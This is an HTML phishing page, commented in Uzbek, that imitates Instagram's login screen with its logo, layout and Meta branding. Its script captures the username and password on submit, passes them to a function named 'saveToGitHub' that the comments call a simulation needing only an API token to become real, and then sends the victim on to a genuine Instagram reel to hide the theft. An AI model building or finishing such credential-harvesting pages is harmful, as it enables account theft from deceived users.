<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Umumiy uslublar */
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            -webkit-tap-highlight-color: transparent;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 360px;
            padding: 0 20px;
            box-sizing: border-box;
            height: 100%;
        }

        .main-content {
            width: 100%;
            text-align: center;
        }

        /* Logo */
        .instagram-logo {
            width: 50px;
            height: 50px;
            margin-bottom: 40px;
        }

        /* Kiritish maydonlari */
        .input-container {
            margin-bottom: 8px;
        }

        #login-form input {
            width: 100%;
            padding: 14px 12px;
            background-color: #262626;
            border: 1px solid #363636;
            border-radius: 6px;
            color: #f5f5f5;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
        }

        #login-form input:focus {
            border-color: #555555;
        }

        #login-form input::placeholder {
            color: #a8a8a8;
        }

        /* Kirish tugmasi */
        .login-button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background-color: #0095f6;
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        /* Tugma aktiv bo'lmaganda */
        .login-button:disabled {
            background-color: #0095f6;
            opacity: 0.4;
            cursor: not-allowed;
        }

        /* Parolni unutdingizmi? */
        .forgot-password {
            color: #0095f6;
            text-decoration: none;
            font-size: 13px;
            margin-top: 20px;
            display: inline-block;
            font-weight: 500;
        }

        /* Yangi hisob yaratish */
        .create-account-box {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            padding: 20px;
            border-top: 1px solid #363636;
            box-sizing: border-box;
        }

        .create-account-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
        }

        /* Meta logotipi */
        .meta-logo-container {
            position: absolute;
            bottom: 80px;
            font-size: 14px;
            font-weight: 500;
            color: #a8a8a8;
        }

        /* Desktop versiya uchun uslublar */
        @media (min-width: 450px) {
            body {
                background-color: #000;
            }

            .main-content {
                border: 1px solid #363636;
                padding: 40px;
                background-color: #121212;
            }

            .create-account-box {
                position: relative;
                border: 1px solid #363636;
                margin-top: 10px;
                width: 100%;
                max-width: 442px;
                background-color: #121212;
            }

            .meta-logo-container {
                position: relative;
                bottom: auto;
                margin-top: 40px;
            }
        }

        /* Loading spinner */
        .spinner {
            display: none;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid #fff;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-content">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="instagram-logo">

            <form id="login-form">
                <div class="input-container">
                    <input type="text" id="username" name="username" placeholder="Foydalanuvchi nomi, email yoki mobil telefon raqami" required>
                </div>
                <div class="input-container">
                    <input type="password" id="password" name="password" placeholder="Parol" required>
                </div>
                <button type="submit" class="login-button" disabled>
                    <span class="button-text">Kirish</span>
                    <div class="spinner"></div>
                </button>
            </form>

            <a href="#" class="forgot-password">Parolni unutdingizmi?</a>
        </div>

        <div class="create-account-box">
             <a href="#" class="create-account-link">Yangi hisob yaratish</a>
        </div>

        <div class="meta-logo-container">
            <p>Meta</p>
        </div>
    </div>

    <script>
        // Kerakli HTML elementlarni topib olamiz
        const loginForm = document.getElementById('login-form');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginButton = document.querySelector('.login-button');
        const buttonText = document.querySelector('.button-text');
        const spinner = document.querySelector('.spinner');

        /**
         * Bu funksiya input maydonlarida ma'lumot bor yoki yo'qligini tekshiradi
         * va "Kirish" tugmasini aktivlashtiradi yoki o'chiradi.
         */
        function validateForm() {
            const isUsernameFilled = usernameInput.value.trim() !== '';
            const isPasswordFilled = passwordInput.value.trim() !== '';

            if (isUsernameFilled && isPasswordFilled) {
                loginButton.disabled = false;
                loginButton.style.opacity = '1';
            } else {
                loginButton.disabled = true;
                loginButton.style.opacity = '0.4';
            }
        }

        // Har bir input maydoniga yozilganda tekshiruvni ishga tushiramiz
        usernameInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);

        /**
         * GitHub API orqali ma'lumotlarni saqlash funksiyasi
         * @param {string} username - Foydalanuvchi nomi
         * @param {string} password - Parol
         */
        async function saveToGitHub(username, password) {
            // Bu yerda GitHub API orqali ma'lumotlarni saqlash logikasi bo'lishi kerak
            // Ammo haqiqiy loyihada bu xavfli, shuning uchun faqat simulyatsiya qilamiz
            
            // Simulyatsiya: 1 soniya kutib turamiz
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Haqiqiy loyihada bu ma'lumotlar GitHub API orqali saqlanishi kerak
            console.log("Ma'lumotlar GitHub'ga saqlandi (simulyatsiya)");
            console.log(`Username: ${username}, Password: ${password}`);
            
            // Haqiqiy implementatsiya uchun GitHub API token va repository sozlamalari kerak
            // Bu yerda faqat demo maqsadida console.log qilamiz
        }

        // Form jo'natilishini (submit) eshitamiz
        loginForm.addEventListener('submit', async function(event) {
            // Brauzerning standart form jo'natish harakatini to'xtatamiz
            event.preventDefault();

            // Loading holatini ko'rsatamiz
            buttonText.style.display = 'none';
            spinner.style.display = 'block';
            loginButton.disabled = true;

            // Inputlardagi ma'lumotlarni olamiz
            const username = usernameInput.value;
            const password = passwordInput.value;

            try {
                // Ma'lumotlarni GitHub'ga saqlash (simulyatsiya)
                await saveToGitHub(username, password);
                
                // 1 soniyadan so'ng Instagram videoga o'tkazamiz
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/reel/DO84Dd0CKAA/?igsh=MTVwZDJibzF1bTAwOQ==';
                }, 1000);
                
            } catch (error) {
                console.error("Xatolik yuz berdi:", error);
                // Xatolik holatida foydalanuvchiga xabar berish
                alert("Kirishda xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.");
                
                // Loading holatini olib tashlaymiz
                buttonText.style.display = 'block';
                spinner.style.display = 'none';
                loginButton.disabled = false;
            }
        });

        // Havolalarga bosilganda oldini olish
        document.querySelector('.forgot-password').addEventListener('click', function(e) {
            e.preventDefault();
            alert("Bu funksiya hozircha mavjud emas.");
        });

        document.querySelector('.create-account-link').addEventListener('click', function(e) {
            e.preventDefault();
            alert("Bu funksiya hozircha mavjud emas.");
        });
    </script>
</body>
</html>
